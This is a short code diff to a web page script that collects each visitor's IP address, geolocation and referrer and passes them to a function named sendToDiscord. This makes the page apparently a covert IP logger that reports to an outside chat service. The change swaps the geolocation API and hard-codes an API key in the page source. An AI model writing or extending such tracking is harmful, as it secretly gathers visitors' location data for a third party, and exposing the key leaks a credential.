@@ -48,6 +48,8 @@
   </div>
 
   <script>
+    const apiKey = '6bae958564a74ff8a59af20f63fa401d'; // Your ipgeolocation.io API key
+
     // Function to send data to Discord
     function sendToDiscord(ip, city, country, referrer) {
       const timestamp = new Date().toISOString();
@@ -78,12 +80,12 @@
         const ip = ipData.ip;
         console.log('IP fetched:', ip);
 
-        // Fetch geolocation using IP (using HTTPS now)
-        fetch(`https://ip-api.com/json/${ip}`)
+        // Fetch geolocation using IP (using ipgeolocation.io)
+        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`)
           .then(response => response.json())
           .then(locationData => {
             const city = locationData.city || "Unknown City";
-            const country = locationData.country || "Unknown Country";
+            const country = locationData.country_name || "Unknown Country";
             const referrer = document.referrer;
 
             console.log('Location fetched:', city, country, referrer);
